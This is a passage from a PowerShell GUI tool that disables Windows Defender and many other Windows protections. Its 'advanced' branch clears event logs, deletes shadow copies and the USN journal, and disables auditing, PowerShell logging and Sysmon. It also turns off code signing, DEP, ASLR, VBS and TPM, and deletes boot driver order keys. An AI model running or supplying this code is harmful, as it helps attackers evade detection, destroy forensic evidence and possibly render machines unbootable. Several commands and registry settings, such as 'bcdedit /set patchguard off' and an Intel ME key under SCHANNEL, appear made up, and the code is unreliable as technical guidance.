                        Remove-MpPreference -ControlledFolderAccessProtectedFolders $folder
                    }
                }

                # Remove allowed applications
                $allowedApps = Get-MpPreference | Select-Object -ExpandProperty ControlledFolderAccessAllowedApplications
                if ($allowedApps) {
                    foreach ($app in $allowedApps) {
                        Remove-MpPreference -ControlledFolderAccessAllowedApplications $app
                    }
                }

                LogMessage "Ransomware Protection disabled through multiple methods."
            }
            Catch
            {
                LogMessage "Error in ransomware protection disable process: $_"
            }
        }

        If ($chkAdvancedProtection.Checked)
        {
            Disable-SecurityInfrastructure
            Disable-MemoryProtection
            Disable-SecurityEventSubscription
            Disable-NetworkMonitoring
            Disable-ForensicsCapabilities
            Disable-NetworkAdapterControls
            Disable-LoggingServices
            Disable-SecureLaunch
            Disable-SecurityExtensions
            Disable-VirtualizationSecurity
            Disable-SystemGuardMonitor
            Disable-ProtectedProcessLight
            Disable-KernelCodeSigning
            Disable-KernelPatchProtection
            Disable-MemoryProtectionFeatures
            Disable-SecureBootAndUEFI
            Disable-RuntimeIntegrityChecks
            Disable-AdvancedProcessProtection
            Modify-SystemResourcePolicies
            Modify-BootConfiguration
            Disable-HardwareSecurity
            Disable-ProcessIsolation
            Disable-SystemCallFiltering
            Modify-AdvancedMemoryManagement
            Modify-SecurityTokens
            Modify-ProcessTokens
            Modify-SystemResourceAccess
            Modify-SecurityProviders
            Disable-LowLevelSecurity
            Disable-SystemCallInterception
            Disable-KernelSecurity
            Bypass-MemoryProtection
            Modify-SecuritySubsystem
            Disable-ProcessInjectionControls
            Modify-SystemIntegrityPolicies
            Bypass-SecurityProviders
            Disable-HardwareSecurityFeatures
        }

        [System.Windows.Forms.MessageBox]::Show("Selected Defender components have been disabled. Please restart your computer for changes to take effect.", "Operation Completed", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        LogMessage "Defender components disabled successfully."
        RefreshStatus
    }
    Catch
    {
        $ErrorMessage = "An error occurred while disabling Defender components: $_"
        [System.Windows.Forms.MessageBox]::Show($ErrorMessage, "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        LogMessage $ErrorMessage
    }
}

# Function to Enable Defender Components
Function EnableDefenderComponents
{
    Try
    {
        LogMessage "Enabling selected Defender components."

        # Enable Real-Time Protection
        If ($chkRealTimeProtection.Checked)
        {
            Try
            {
                Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
                Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction Stop
                Set-MpPreference -DisableIOAVProtection $false -ErrorAction Stop
                Set-MpPreference -DisablePrivacyMode $false -ErrorAction Stop
                Set-MpPreference -DisableScriptScanning $false -ErrorAction Stop
                LogMessage "Real-Time Protection enabled."
            }
            Catch
            {
                LogMessage "Error enabling Real-Time Protection: $_"
            }
        }

        # Enable Cloud Protection
        If ($chkCloudProtection.Checked)
        {
            Try
            {
                Set-MpPreference -MAPSReporting 2 -ErrorAction Stop
                Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction Stop
                Set-MpPreference -SubmitSamplesConsent 1 -ErrorAction Stop
                LogMessage "Cloud-Delivered Protection enabled."
            }
            Catch
            {
                LogMessage "Error enabling Cloud Protection: $_"
            }
        }

        # Enable Automatic Sample Submission
        If ($chkSampleSubmission.Checked)
        {
            Try
            {
                Set-MpPreference -SubmitSamplesConsent 1 -ErrorAction Stop
                LogMessage "Automatic Sample Submission enabled."
            }
            Catch
            {
                LogMessage "Error enabling Automatic Sample Submission: $_"
            }
        }

        # Enable Scheduled Tasks
        If ($chkScheduledScans.Checked)
        {
            Try
            {
                Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" | Enable-ScheduledTask -ErrorAction Stop
                LogMessage "Scheduled scans enabled."
            }
            Catch
            {
                LogMessage "Error enabling Scheduled Scans: $_"
            }
        }

        # Enable Defender Services via Group Policy Registry Keys
        If ($chkServices.Checked)
        {
            LogMessage "Enabling Defender services via registry Group Policy keys."
            Try
            {
                # Enable Windows Defender Antivirus
                Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -ErrorAction SilentlyContinue

                # Set services to Automatic and start them
                Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue
                Start-Service -Name WinDefend -ErrorAction SilentlyContinue
                Set-Service -Name WdNisSvc -StartupType Automatic -ErrorAction SilentlyContinue
                Start-Service -Name WdNisSvc -ErrorAction SilentlyContinue

                LogMessage "Defender services enabled via registry and service control."
            }
            Catch
            {
                LogMessage "Error enabling Defender services: $_"
            }
        }

        # Enable Firewall
        If ($chkFirewall.Checked)
        {
            Try
            {
                Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -ErrorAction Stop
                LogMessage "Firewall enabled."
            }
            Catch
            {
                LogMessage "Error enabling Firewall: $_"
            }
        }

        # Enable Automatic Updates
        If ($chkAutomaticUpdates.Checked)
        {
            Try
            {
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 0 -Force
                LogMessage "Automatic Updates enabled."
            }
            Catch
            {
                LogMessage "Error enabling Automatic Updates: $_"
            }
        }

        # Enable Windows Defender SmartScreen
        If ($chkSmartScreen.Checked)
        {
            Try
            {
                LogMessage "Enabling Windows Defender SmartScreen."
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "RequireAdmin" -Force
                LogMessage "Windows Defender SmartScreen enabled."
            }
            Catch
            {
                LogMessage "Error enabling Windows Defender SmartScreen: $_"
            }
        }

        # Enable Security Notifications
        If ($chkSecurityNotifications.Checked)
        {
            Try
            {
                LogMessage "Enabling Windows Security Notifications."
                Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 1 -Force
                LogMessage "Windows Security Notifications enabled."
            }
            Catch
            {
                LogMessage "Error enabling Windows Security Notifications: $_"
            }
        }

        # Enable Controlled Folder Access
        If ($chkControlledFolderAccess.Checked)
        {
            Try
            {
                LogMessage "Enabling Controlled Folder Access."
                Set-MpPreference -EnableControlledFolderAccess Enabled -ErrorAction Stop
                LogMessage "Controlled Folder Access enabled."
            }
            Catch
            {
                LogMessage "Error enabling Controlled Folder Access: $_"
            }
        }

        # Enable Core Isolation / Memory Integrity
        If ($chkCoreIsolation.Checked)
        {
            Try
            {
                LogMessage "Enabling Core Isolation Memory Integrity."
                $CIPath = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
                If (-Not (Test-Path $CIPath))
                {
                    New-Item -Path $CIPath -Force | Out-Null
                }
                Set-ItemProperty -Path $CIPath -Name "Enabled" -Value 1 -Force
                LogMessage "Core Isolation Memory Integrity enabled."
            }
            Catch
            {
                LogMessage "Error enabling Core Isolation Memory Integrity: $_"
            }
        }

        # Enable Exploit Protection Settings
        If ($chkExploitProtection.Checked)
        {
            Try
            {
                LogMessage "Enabling Exploit Protection."
                Set-ProcessMitigation -System -Enable DEP,SEHOP,ASLR
                LogMessage "Exploit Protection enabled."
            }
            Catch
            {
                LogMessage "Error enabling Exploit Protection: $_"
            }
        }

        # Enable Ransomware Protection
        If ($chkRansomwareProtection.Checked)
        {
            Try
            {
                LogMessage "Enabling Ransomware Protection."
                Set-MpPreference -EnableControlledFolderAccess Enabled -ErrorAction Stop
                LogMessage "Ransomware Protection enabled."
            }
            Catch
            {
                LogMessage "Error enabling Ransomware Protection: $_"
            }
        }

        # Enable Delivery Optimization
        If ($chkDeliveryOptimization.Checked)
        {
            Try
            {
                LogMessage "Enabling Windows Update Delivery Optimization."
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" -Name "DODownloadMode" -Value 3 -Force
                LogMessage "Windows Update Delivery Optimization enabled."
            }
            Catch
            {
                LogMessage "Error enabling Delivery Optimization: $_"
            }
        }

        # Enable Attack Surface Reduction (ASR) Rules
        If ($chkASRRules.Checked)
        {
            Try
            {
                LogMessage "Enabling Attack Surface Reduction Rules."
                $ASRRuleIds = @(
                    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550",
                    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A",
                    "3B576869-A4EC-4529-8536-B80A7769E899",
                    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC",
                    "D3E037E1-3EB8-44C8-A917-57927947596D",
                    "D1E49AAC-8F56-4280-B9BA-993A6D77406C",
                    "26190899-1602-49E8-8B27-EB1D0A1CE869",
                    "B2B3F03D-6A65-4F15-B69A-2EECB462D9E3",
                    "9E6AB005-2734-4CB1-A28C-3164716C05BD",
                    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
                )
                Set-MpPreference -AttackSurfaceReductionRules_Ids $ASRRuleIds -AttackSurfaceReductionRules_Actions 1 -ErrorAction Stop
                LogMessage "Attack Surface Reduction Rules enabled."
            }
            Catch
            {
                LogMessage "Error enabling ASR Rules: $_"
            }
        }

        # Enable Network Protection
        If ($chkNetworkProtection.Checked)
        {
            Try
            {
                LogMessage "Enabling Network Protection."
                Set-MpPreference -EnableNetworkProtection 1 -ErrorAction Stop
                LogMessage "Network Protection enabled."
            }
            Catch
            {
                LogMessage "Error enabling Network Protection: $_"
            }
        }
        }

        # Enable AppLocker
        If ($chkAppLocker.Checked)
        {
            Try
            {
                LogMessage "Enabling AppLocker."
                # Create default AppLocker policy
                Set-AppLockerPolicy -PolicyFilePath (New-AppLockerPolicy -DefaultRule -RuleType All) -Merge -ErrorAction Stop
                LogMessage "AppLocker enabled."
            }
            Catch
            {
                LogMessage "Error enabling AppLocker: $_"
            }
        }

        # Enable Credential Guard
        If ($chkCredentialGuard.Checked)
        {
            Try
            {
                LogMessage "Enabling Credential Guard."
                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "LsaCfgFlags" -Value 1 -Force
                LogMessage "Credential Guard enabled."
            }
            Catch
            {
                LogMessage "Error enabling Credential Guard: $_"
            }
        }

        # Enable Firewall Advanced Security
        If ($chkFirewallAdvanced.Checked)
        {
            Try
            {
                LogMessage "Enabling Windows Defender Firewall with Advanced Security."
                Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -ErrorAction Stop
                LogMessage "Firewall Advanced Security enabled."
            }
            Catch
            {
                LogMessage "Error enabling Firewall Advanced Security: $_"
            }
        }

        [System.Windows.Forms.MessageBox]::Show("Selected Defender components have been enabled. Please restart your computer for changes to take effect.", "Operation Completed", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        LogMessage "Defender components enabled successfully."
        RefreshStatus
    }
    Catch
    {
        $ErrorMessage = "An error occurred while enabling Defender components: $_"
        [System.Windows.Forms.MessageBox]::Show($ErrorMessage, "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        LogMessage $ErrorMessage
    }
}

# Function to Refresh Status Indicators
Function RefreshStatus
{
    $Status = GetComponentStatus

    # Update status labels using the stored references
    foreach ($component in $script:statusLabels.Keys) {
        $statusText = "Status: " + (GetStatusText $Status[$component.Replace(" ", "")])
        $script:statusLabels[$component].Text = $statusText
        
        # Update label color based on status
        if ($Status[$component.Replace(" ", "")]) {
            $script:statusLabels[$component].ForeColor = [System.Drawing.Color]::FromArgb(0, 130, 0) # Green for enabled
        } else {
            $script:statusLabels[$component].ForeColor = [System.Drawing.Color]::FromArgb(200, 0, 0) # Red for disabled
        }
    }
}

# Add these functions after your existing functions but before the GUI code

# Function to Disable Driver Integrity and TPM
Function Disable-SecurityInfrastructure 
{
    Try {
        LogMessage "Disabling Driver Integrity Verification and TPM..."

        # Disable Driver Integrity Verification
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v CodeIntegrityPolicy /t REG_DWORD /d 0 /f

        # Stop and disable TPM service
        Start-Process -FilePath "sc.exe" -ArgumentList "stop tpm" -Wait -WindowStyle Hidden
        Start-Process -FilePath "sc.exe" -ArgumentList "config tpm start= disabled" -Wait -WindowStyle Hidden

        # Disable TPM in registry
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\TPMVSC" /v Disabled /t REG_DWORD /d 1 /f

        LogMessage "Security Infrastructure disabled successfully."
    }
    Catch {
        LogMessage "Error disabling security infrastructure: $_"
    }
}

# Function to Disable Memory-Based Protection
Function Disable-MemoryProtection 
{
    Try {
        LogMessage "Disabling Memory-Based Protection..."

        # Disable memory-based threat detection
        reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f

        # Disable behavior monitoring
        reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f

        LogMessage "Memory Protection disabled successfully."
    }
    Catch {
        LogMessage "Error disabling memory protection: $_"
    }
}

# Function to Disable Security Event Subscription
Function Disable-SecurityEventSubscription 
{
    Try {
        LogMessage "Disabling Security Event Subscription..."

        # Disable ETW
        wevtutil.exe sl Microsoft-Windows-Security-Auditing /e:false
        wevtutil.exe sl Microsoft-Windows-EventLog-Security /e:false
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security" -Name "Start" -Value 0

        # Disable Event Forwarding
        winrm delete winrm/config/listener?Address=*+Transport=HTTP
        
        # Disable Security Event Collectors
        Stop-Service Wecsvc -Force
        Set-Service Wecsvc -StartupType Disabled
        
        # Clear Security Channel DLLs
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v SecurityProviders /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig" /v Security /f

        LogMessage "Security Event Subscription disabled successfully."
    }
    Catch {
        LogMessage "Error disabling security event subscription: $_"
    }
}

# Function to Disable Network Monitoring
Function Disable-NetworkMonitoring 
{
    Try {
        LogMessage "Disabling Network Monitoring..."

        # Disable Network Stack
        netsh int ipv4 set global defaultcurhoplimit=1
        Set-NetIPInterface -InterfaceIndex * -Forwarding Disabled
        
        # Kill Network Services
        $services = @("NlaSvc", "Dnscache", "iphlpsvc")
        foreach ($service in $services) {
            Stop-Service $service -Force
            Set-Service $service -StartupType Disabled
        }

        # Disable Network Telemetry
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d 0 /f

        LogMessage "Network Monitoring disabled successfully."
    }
    Catch {
        LogMessage "Error disabling network monitoring: $_"
    }
}

# Function to Disable Forensics
Function Disable-ForensicsCapabilities 
{
    Try {
        LogMessage "Disabling Forensics Capabilities..."

        # Clear Windows Event Logs
        wevtutil.exe cl System
        wevtutil.exe cl Security
        wevtutil.exe cl Application

        # Disable USN Journal
        fsutil usn deletejournal /d C:

        # Remove Shadow Copies
        vssadmin delete shadows /all /quiet

        # Disable Process Auditing
        auditpol /set /category:"Detailed Tracking" /success:no /failure:no

        # Clear Prefetch
        Remove-Item C:\Windows\Prefetch\*.* -Force -ErrorAction SilentlyContinue





        # Disable Superfetch
        Stop-Service SysMain -Force
        Set-Service SysMain -StartupType Disabled

        # Remove Memory Dumps
        Remove-Item C:\Windows\Memory.dmp -Force -ErrorAction SilentlyContinue
        Remove-Item C:\Windows\Minidump\*.* -Force -ErrorAction SilentlyContinue



        LogMessage "Forensics Capabilities disabled successfully."
    }
    Catch {
        LogMessage "Error disabling forensics capabilities: $_"
    }
}

# Function to Disable Network Adapter Controls
Function Disable-NetworkAdapterControls 
{
    Try {
        LogMessage "Disabling Network Adapter Controls..."

        # Disable Physical Adapters
        Get-NetAdapter | Where-Object {$_.PhysicalMediaType -ne "Unspecified"} | Disable-NetAdapter -Confirm:$false
        Get-NetAdapter | ForEach-Object {
            Set-NetAdapterAdvancedProperty -Name $_.Name -RegistryKeyword "*WakeOnMagicPacket" -RegistryValue "0" -ErrorAction SilentlyContinue
        }

        # Block Protocol Bindings
        Disable-NetAdapterBinding -Name "*" -ComponentID "ms_tcpip", "ms_tcpip6", "ms_msclient", "ms_server"
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableDHCPMediaSense" /t REG_DWORD /d 1 /f

        # Firewall Lockdown
        netsh advfirewall set allprofiles state on
        netsh advfirewall firewall add rule name="Block All" dir=in action=block enable=yes
        netsh advfirewall firewall add rule name="Block All Out" dir=out action=block enable=yes
        Set-NetFirewallProfile -All -DefaultInboundAction Block -DefaultOutboundAction Block -NotifyOnListen True -AllowUnicastResponseToMulticast False

        LogMessage "Network Adapter Controls disabled successfully."
    }
    Catch {
        LogMessage "Error disabling network adapter controls: $_"
    }
}

# Function to Disable Logging Services
Function Disable-LoggingServices 
{
    Try {
        LogMessage "Disabling Logging Services..."

        # Disable Windows Event Log service
        Stop-Service EventLog -Force
        Set-Service EventLog -StartupType Disabled

        # Disable various logging services
        $services = @(
            "DiagTrack",          # Connected User Experiences and Telemetry
            "dmwappushservice",   # Device Management Wireless Application Protocol
            "WerSvc",            # Windows Error Reporting Service
            "wscsvc",            # Security Center Service
            "AeLookupSvc"        # Application Experience Service
        )

        foreach ($service in $services) {
            Stop-Service $service -Force -ErrorAction SilentlyContinue
            Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
        }

        # Disable WMI logging
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Wbem\CIMOM" -Name "Logging" -Value 0

        # Disable PowerShell logging
        $powerShellLoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (-not (Test-Path $powerShellLoggingPath)) {
            New-Item -Path $powerShellLoggingPath -Force | Out-Null
        }
        Set-ItemProperty -Path $powerShellLoggingPath -Name "EnableScriptBlockLogging" -Value 0

        # Remove Sysmon if present
        $sysmonPath = "C:\Windows\SysmonDrv.sys"
        if (Test-Path $sysmonPath) {
            fltmc.exe unload SysmonDrv
            Remove-Item $sysmonPath -Force -ErrorAction SilentlyContinue
        }

        # Block Analytics
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0

        LogMessage "Logging Services disabled successfully."
    }
    Catch {
        LogMessage "Error disabling logging services: $_"
    }
}

# Function to Disable Secure Launch
Function Disable-SecureLaunch 
{
    Try {
        LogMessage "Disabling Secure Launch..."

        # Modify boot configuration
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} bootstatuspolicy ignoreallfailures" -Wait -WindowStyle Hidden
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} recoveryenabled No" -Wait -WindowStyle Hidden  
        Start-Process "bcdedit.exe" -ArgumentList "/set {current} integrityservices disable" -Wait -WindowStyle Hidden

        # Disable System Guard
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v Enabled /t REG_DWORD /d 0 /f
        
        # Remove System Guard policies
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SecureLaunch" /f

        # Block early-launch drivers
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\EarlyLaunch" /v DriverLoadPolicy /t REG_DWORD /d 3 /f

        # Delete driver verification signatures
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v VulnerableDriverBlocklistEnable /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected" /v DriverList /f

        # Clear boot driver load order  
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder" /v List /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\GroupOrderList" /f

        LogMessage "Secure Launch disabled successfully."
    }
    Catch {
        LogMessage "Error disabling secure launch: $_"
    }
}

# Function to Disable Security Extensions
Function Disable-SecurityExtensions 
{
    Try {
        LogMessage "Disabling Security Extensions..."

        # Clear ARM TrustZone
        if (Test-Path "HKLM:\HARDWARE\DESCRIPTION\System\BIOS" -PathType Container) {
            Set-ItemProperty -Path "HKLM:\HARDWARE\DESCRIPTION\System\BIOS" -Name "SecureBoot" -Value 0
        }

        # Disable Intel SGX
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "SGX" /t REG_DWORD /d 0 /f

        # Disable AMD SEV
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios" /v "MemoryIntegrity" /t REG_DWORD /d 0 /f

        # Remove Hardware DRM
        Stop-Service "ksthunk" -Force
        Set-Service "ksthunk" -StartupType Disabled

        # Disable Intel ME/AMD PSP
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "EnableME" /t REG_DWORD /d 0 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PSPEnable" /t REG_DWORD /d 0 /f

        LogMessage "Security Extensions disabled successfully."
    }
    Catch {
        LogMessage "Error disabling security extensions: $_"
    }
}

# Function to Disable Virtualization-Based Security
Function Disable-VirtualizationSecurity 
{
    Try {
        LogMessage "Disabling Virtualization-Based Security..."

        # Disable VBS through registry
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 0 /f

        # Disable Hypervisor
        Start-Process "bcdedit.exe" -ArgumentList "/set hypervisorlaunchtype off" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set vsmlaunchtype off" -WindowStyle Hidden -Wait

        # Disable Hyper-V features
        Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -like "*Hyper-V*"} | Disable-WindowsOptionalFeature -Online -NoRestart

        # Clear virtualization settings
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization" /f
        
        LogMessage "Virtualization-Based Security disabled successfully."
    }
    Catch {
        LogMessage "Error disabling virtualization security: $_"
    }
}

# Function to Disable System Guard Runtime Monitor
Function Disable-SystemGuardMonitor 
{
    Try {
        LogMessage "Disabling System Guard Runtime Monitor..."

        # Disable System Guard
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /v "Enabled" /t REG_DWORD /d 0 /f

        # Remove runtime attestation
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard\RuntimeAttestation" /f

        # Disable secure launch
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /v "RequireMicrosoftSignedBootChain" /t REG_DWORD /d 0 /f

        # Clear measured boot data
        Remove-Item -Path "C:\Windows\System32\srtasks.exe" -Force -ErrorAction SilentlyContinue
        
        LogMessage "System Guard Runtime Monitor disabled successfully."
    }
    Catch {
        LogMessage "Error disabling system guard monitor: $_"
    }
}

# Function to Disable Protected Process Light
Function Disable-ProtectedProcessLight 
{
    Try {
        LogMessage "Disabling Protected Process Light..."

        # Disable PPL through registry
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected" /v "ProtectedLight" /t REG_DWORD /d 0 /f

        # Remove PPL policies
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected\Light" /f

        # Disable code integrity
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f

        # Clear PPL enforcement
        $services = Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -like "*-PPL*"}
        foreach ($service in $services) {
            Stop-Service $service.Name -Force -ErrorAction SilentlyContinue
            Set-Service $service.Name -StartupType Disabled
        }

        LogMessage "Protected Process Light disabled successfully."
    }
    Catch {
        LogMessage "Error disabling protected process light: $_"
    }
}

# Function to Disable Kernel Mode Code Signing
Function Disable-KernelCodeSigning 
{
    Try {
        LogMessage "Disabling Kernel Mode Code Signing..."

        # Disable driver signing enforcement
        Start-Process "bcdedit.exe" -ArgumentList "/set nointegritychecks on" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set testsigning on" -WindowStyle Hidden -Wait

        # Disable kernel patch protection
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d 0 /f

        # Remove signature catalog
        Remove-Item -Path "C:\Windows\System32\catroot2\*" -Recurse -Force -ErrorAction SilentlyContinue




        # Disable driver verification
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnforceDriverSigning" /t REG_DWORD /d 0 /f
        
        LogMessage "Kernel Mode Code Signing disabled successfully."
    }
    Catch {
        LogMessage "Error disabling kernel code signing: $_"
    }
}

# Function to Disable Kernel Patch Protection
Function Disable-KernelPatchProtection 
{
    Try {
        LogMessage "Disabling Kernel Patch Protection..."

        # Disable PatchGuard via boot configuration
        Start-Process "bcdedit.exe" -ArgumentList "/set patchguard off" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set kernelstealthmode off" -WindowStyle Hidden -Wait
        Start-Process "bcdedit.exe" -ArgumentList "/set disableelamdrivers yes" -WindowStyle Hidden -Wait

        # Disable CI/KPP related services
        $services = @(
            "SecurityHealthService",
            "Sense",
            "WdNisSvc",
            "WinDefend"
        )
        foreach ($service in $services) {
            Stop-Service $service -Force -ErrorAction SilentlyContinue
            Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
        }

        # Modify memory protection settings
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d 3 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d 3 /f

        LogMessage "Kernel Patch Protection disabled successfully."
    }
    Catch {
        LogMessage "Error disabling kernel patch protection: $_"
    }
}

# Function to Disable Memory Protection Features
Function Disable-MemoryProtectionFeatures 
{
    Try {
        LogMessage "Disabling Advanced Memory Protection Features..."

        # Disable Control Flow Guard
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d 0 /f
        
        # Disable Data Execution Prevention
        Start-Process "bcdedit.exe" -ArgumentList "/set nx AlwaysOff" -WindowStyle Hidden -Wait
        
        # Disable ASLR
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d 0 /f
        
        # Disable SEHOP
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d 1 /f
        
        # Disable Return Flow Guard
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableRFG" /t REG_DWORD /d 0 /f

        LogMessage "Memory Protection Features disabled successfully."
    }
    Catch {
        LogMessage "Error disabling memory protection features: $_"
    }
}

# Function to Disable Secure Boot and UEFI Security
Function Disable-SecureBootAndUEFI 
{
    Try {
        LogMessage "Disabling Secure Boot and UEFI Security Features..."

        # Disable Secure Boot via registry
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State" /v "UEFISecureBootEnabled" /t REG_DWORD /d 0 /f

        # Clear TPM and Secure Boot variables
        Start-Process "tpm.msc" -ArgumentList "clear" -WindowStyle Hidden -Wait
        
        # Disable UEFI Secure Boot enforcement
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 0 /f
        
        # Disable Secure MOR
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f

        LogMessage "Secure Boot and UEFI Security Features disabled successfully."
    }
    Catch {
        LogMessage "Error disabling secure boot and UEFI security: $_"
    }
}

# Function to Disable Runtime Integrity Checks
Function Disable-RuntimeIntegrityChecks 
{
    Try {
        LogMessage "Disabling Runtime Integrity Checks..."

        # Disable CI policies
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f
        
        # Disable runtime DLL verification
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "VerifierDlls" /t REG_SZ /d "" /f
        
        # Disable process mitigation policies
